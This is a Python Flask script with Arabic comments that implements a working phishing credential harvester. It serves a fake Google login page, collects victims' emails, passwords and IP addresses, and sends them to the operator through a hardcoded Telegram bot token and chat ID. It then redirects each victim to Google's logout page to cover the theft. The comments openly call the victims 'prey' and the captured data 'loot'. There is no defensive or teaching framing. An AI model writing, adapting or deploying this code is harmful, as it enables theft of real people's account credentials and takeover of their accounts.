import requests
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# --- بيانات الصياد (تعديل هنا) ---
# ضع توكن البوت الخاص بك من @BotFather
TOKEN = "8501788737:AAGT30o-tywPq3G7tr1bDPyq_8pnQahOL7o"
# ضع الأيدي الخاص بك من @userinfobot
CHAT_ID = "8133357563"

def send_telegram_msg(email, password, ip):
    """دالة إرسال البيانات إلى تلجرام"""
    text = (
        f"🎯 **صيد جديد يا Hunter!**\n\n"
        f"📧 **الإيميل:** `{email}`\n"
        f"🔑 **الباسورد:** `{password}`\n"
        f"🌐 **IP الضحية:** `{ip}`\n\n"
        f"🚀 تم تحويله الآن لصفحة تسجيل الخروج."
    )
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, data=payload)
    except:
        pass

@app.route('/')
def home():
    # عرض واجهة جوجل المموّهة (تأكد أن الملف اسمه index.html داخل مجلد templates)
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    # سحب البيانات من الواجهة
    email = request.form.get('email')
    password = request.form.get('password')
    
    # محاولة جلب الـ IP الخاص بالضحية
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # إرسال الغنيمة إليك فوراً
    send_telegram_msg(email, password, user_ip)
    
    # الحركة القاضية: تسجيل الخروج الفعلي من جوجل وتوجيهه هناك
    return redirect("https://accounts.google.com/Logout")

if __name__ == "__main__":
    # تشغيل السيرفر
    app.run(host='0.0.0.0', port=5000)
  
